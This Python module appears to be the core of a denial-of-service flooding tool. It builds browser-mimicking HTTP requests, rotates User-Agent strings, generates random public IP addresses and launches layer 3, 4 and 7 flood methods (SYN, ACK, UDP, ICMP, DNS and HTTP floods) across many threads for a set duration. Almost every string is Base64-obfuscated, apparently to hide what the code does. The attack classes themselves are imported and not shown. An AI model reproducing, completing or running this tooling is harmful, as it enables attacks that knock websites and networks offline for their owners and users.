from random import choice, randrange
from threading import Thread
from typing import Optional, Callable, List, Tuple
from urllib.parse import urlparse
import base64
import ipaddress

# Utility function to decode Base64 strings
def _decode_str(encoded: str) -> str:
    return base64.b64decode(encoded).decode("utf-8")

def parse_url(url: str):
    if _decode_str("Oi8v") not in url:
        url = _decode_str("aHR0cDov") + url

    parsed = urlparse(url)
    if not parsed.scheme or not parsed.hostname:
        return None

    # Reject private/reserved IP addresses to avoid local network abuse
    try:
        host_ip = ipaddress.ip_address(parsed.hostname)
        if host_ip.is_private or host_ip.is_loopback or host_ip.is_multicast or host_ip.is_reserved:
            return None
    except ValueError:
        # hostname is not an IP literal, allow domain names
        pass

    port = parsed.port or (443 if parsed.scheme.lower() == _decode_str("aHR0cHM=") else 80)
    path = parsed.path if parsed.path else _decode_str("Lw==")
    if parsed.query:
        path += _decode_str("Pw==") + parsed.query

    return Endpoint(host=parsed.hostname, port=port, scheme=parsed.scheme, path=path)

# Endpoint Class
class Endpoint:
    def __init__(self, host: str, port: int = 80, scheme: str = _decode_str("aHR0cA=="), path: str = _decode_str("Lw==")):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.path = path

# Network Utilities
class NetworkUtilities:
    def __init__(self):
        # Common User-Agent strings (Base64 encoded)
        self.user_agents = [
            _decode_str("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IENocm9tZS8xMTUuMCBTYWZhcmkvNTM3LjM2"),
            _decode_str("TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgQ2hyb21lLzExNC4wIFNhZmFyaS81MzcuMzY="),
            _decode_str("TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgU2FmYXJpLzYwNS4xLjE1IFZlcnNpb24vMTYuMw=="),
            _decode_str("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTE1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE1LjA="),
            _decode_str("TW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNl81KSBTYWZhcmkvNjA0LjEgVmVyc2lvbi8xNi4w"),
            _decode_str("TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyB TTS1HOTkxQikgQ2hyb21lLzExNC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2"),
        ]

        # Reserved IP ranges (private, local, special)
        self._private_ip_ranges: List[Tuple[int, int]] = [
            self._ip_to_int(_decode_str("MTAuMC4wLjA=")), self._ip_to_int(_decode_str("MTAuMjU1LjI1NS4yNTU=")),
            self._ip_to_int(_decode_str("MTI3LjAuMC4w")), self._ip_to_int(_decode_str("MTI3LjI1NS4yNTUuMjU1")),
            self._ip_to_int(_decode_str("MTcyLjE2LjAuMA==")), self._ip_to_int(_decode_str("MTcyLjMxLjI1NS4yNTU=")),
            self._ip_to_int(_decode_str("MTkyLjE2OC4wLjA=")), self._ip_to_int(_decode_str("MTkyLjE2OC4yNTUuMjU1")),
            self._ip_to_int(_decode_str("MTY5LjI1NC4wLjA=")), self._ip_to_int(_decode_str("MTY5LjI1NC4yNTUuMjU1")),
            self._ip_to_int(_decode_str("MTAwLjY0LjAuMA==")), self._ip_to_int(_decode_str("MTAwLjEyNy4yNTUuMjU1")),
            self._ip_to_int(_decode_str("MTk4LjE4LjAuMA==")), self._ip_to_int(_decode_str("MTk4LjE5LjI1NS4yNTU=")),
            self._ip_to_int(_decode_str("MjI0LjAuMC4w")), self._ip_to_int(_decode_str("MjM5LjI1NS4yNTUuMjU1")),
            self._ip_to_int(_decode_str("MjQwLjAuMC4w")), self._ip_to_int(_decode_str("MjU1LjI1NS4yNTUuMjU0")),
        ]
        it = iter(self._private_ip_ranges)
        self._private_ip_ranges = [(s, e) for s, e in zip(it, it)]

        # Precompute allowed IP ranges for randomization
        self._allowed_random_ip_ranges = self._compute_allowed_random_ip_ranges()

    # Random User-Agent
    def random_user_agent(self) -> str:
        return choice(self.user_agents)

    # Build HTTP request headers
    def base_headers(self, method: str, endpoint) -> str:
        http_version = choice([_decode_str("MS4w"), _decode_str("MS4x")])
        return (
            f"{method.upper()} {endpoint.path} HTTP/{http_version}\r\n"
            f"{_decode_str('QWNjZXB0LUVuY29kaW5n')}: {_decode_str('Z3ppcCwgZGVmbGF0ZSwgYnI=')}\r\n"
            f"{_decode_str('QWNjZXB0LUxhbmd1YWdl')}: {_decode_str('ZW4tVVMsZW47cT0wLjM=')}\r\n"
            f"{_decode_str('Q2FjaGUtQ29udHJvbA==')}: {_decode_str('bWF4LWFnZT0w')}\r\n"
            f"{_decode_str('Q29ubmVjdGlvbg==')}: {_decode_str('a2VlcC1hbGl2ZQ==')}\r\n"
            f"{_decode_str('U2VjLUZldGNoLURlc3Q=')}: {_decode_str('ZG9jdW1lbnQ=')}\r\n"
            f"{_decode_str('U2VjLUZldGNoLU1vZGU=')}: {_decode_str('bmF2aWdhdGU=')}\r\n"
            f"{_decode_str('U2VjLUZldGNoLVNpdGU=')}: {_decode_str('bm9uZQ==')}\r\n"
            f"{_decode_str('U2VjLUZldGNoLVVzZXI=')}: {_decode_str('PzE=')}\r\n"
            f"{_decode_str('U2VjLUdwYw==')}: {_decode_str('MQ==')}\r\n"
            f"{_decode_str('UHJhZ21h')}: {_decode_str('bm8tY2FjaGU=')}\r\n"
            f"{_decode_str('VXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cw==')}: {_decode_str('MQ==')}\r\n"
        )

    # Build full HTTP request
    def build_request(self, endpoint, method: str = _decode_str("R0VU"), body: str = "") -> bytes:
        method = method.upper()
        body_bytes = body.encode("utf-8") if isinstance(body, str) else body

        headers = self.base_headers(method, endpoint)
        if not headers.endswith("\r\n"):
            headers += "\r\n"

        # Host header
        host = endpoint.host.replace("\r", "").replace("\n", "")
        port = getattr(endpoint, "port", None)
        headers += f"{_decode_str('SG9zdA==')}: {host}:{port}\r\n" if port and port not in (80, 443) else f"{_decode_str('SG9zdA==')}: {host}\r\n"

        # User-Agent header
        ua = self.random_user_agent().replace("\r", "").replace("\n", "")
        headers += f"{_decode_str('VXNlci1BZ2VudA==')}: {ua}\r\n"

        # Content headers for POST/PUT/PATCH or if body exists
        if method in (_decode_str("UE9TVA=="), _decode_str("UFVU"), _decode_str("UEFUQ0g=")) or body_bytes:
            headers += f"{_decode_str('Q29udGVudC1MZW5ndGg=')}: {len(body_bytes)}\r\n"
            if _decode_str('Q29udGVudC1UeXBlOg==') not in headers:
                headers += f"{_decode_str('Q29udGVudC1UeXBl')}: {_decode_str('YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PXV0Zi04')}\r\n"

        return (headers + "\r\n").encode("utf-8") + body_bytes

    # IP utilities
    def _ip_to_int(self, ip_str: str) -> int:
        parts = list(map(int, ip_str.split(".")))
        return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

    def is_reserved_ip(self, ip_str: str) -> bool:
        try:
            parts = list(map(int, ip_str.split(".")))
            if len(parts) != 4:
                return True
            ip_int = self._ip_to_int(ip_str)
        except Exception:
            return True
        return any(start <= ip_int <= end for start, end in self._private_ip_ranges)

    # Compute allowed random IP ranges
    def _compute_allowed_random_ip_ranges(self) -> List[Tuple[int, int]]:
        allowed = []
        base_start = self._ip_to_int(_decode_str("MS4wLjAuMA=="))
        base_end = self._ip_to_int(_decode_str("MjIzLjI1NS4yNTUuMjU1"))

        current_ranges = [(base_start, base_end)]
        for rstart, rend in self._private_ip_ranges:
            new_ranges = []
            for a, b in current_ranges:
                if rend < a or rstart > b:
                    new_ranges.append((a, b))
                    continue
                if rstart > a:
                    new_ranges.append((a, rstart - 1))
                if rend < b:
                    new_ranges.append((rend + 1, b))
            current_ranges = new_ranges
        return [rng for rng in current_ranges if rng[0] <= rng[1]]

    # Generate random IP
    def create_random_ip(self) -> str:
        ranges = self._allowed_random_ip_ranges
        if not ranges:
            raise RuntimeError(_decode_str("Tm8gYWxsb3dlZCBJUCByYW5nZXMgYXZhaWxhYmxlIGZvciByYW5kb21pemF0aW9uLg=="))

        total = sum((end - start + 1) for start, end in ranges)
        pick = randrange(total)
        acc = 0
        for start, end in ranges:
            size = end - start + 1
            if pick < acc + size:
                val = start + (pick - acc)
                a, b, c, d = (val >> 24 & 0xFF, val >> 16 & 0xFF, val >> 8 & 0xFF, val & 0xFF)
                return f"{a}.{b}.{c}.{d}"
            acc += size

        # Fallback to last IP
        last = ranges[-1][1]
        a, b, c, d = (last >> 24 & 0xFF, last >> 16 & 0xFF, last >> 8 & 0xFF, last & 0xFF)
        return f"{a}.{b}.{c}.{d}"

    # Run multiple threads
    def run_threads(self, func, args=(), count: int = 1):
        for _ in range(count):
            t = Thread(target=func, args=args, daemon=True)
            t.start()

    # Execute network request
    def execute_request(self, endpoint, duration: int, method: str, threads: int):

        def get_function(method: str) -> Callable:
            from .layers import L7, L4, L3
            
            method = method.upper()
            if method in (_decode_str("R0VU"), _decode_str("UE9TVA=="), _decode_str("UFVU"), _decode_str("REVMRVRF"), _decode_str("SEVBRA=="), _decode_str("RE5T")):
                l7 = L7(endpoint, duration=duration)
                return getattr(l7, method)
            elif method in (_decode_str("QUNL"), _decode_str("U1lO"), _decode_str("RklO"), _decode_str("UlNU"), _decode_str("VENQ"), _decode_str("VURQ")):
                l4 = L4(endpoint, duration=duration)
                return getattr(l4, method)
            elif method == _decode_str("SUNNUA=="):
                l3 = L3(endpoint, duration=duration)
                return getattr(l3, method)
            
            return

        func = get_function(method)
        if func:
            args = () if method != _decode_str("RE5T") else (self.create_random_ip(),)
            self.run_threads(func, args, threads)